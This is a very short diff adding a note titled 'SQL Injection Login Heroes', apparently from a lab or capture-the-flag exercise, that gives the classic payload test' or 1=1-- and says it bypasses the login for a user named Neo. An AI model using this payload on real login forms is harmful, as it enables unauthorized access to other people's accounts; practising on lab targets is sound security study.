@@ -1,0 +1,4 @@
+SQL Injection Login Heroes
+
+test' or 1=1-- 
+result: bypasses login for Neo
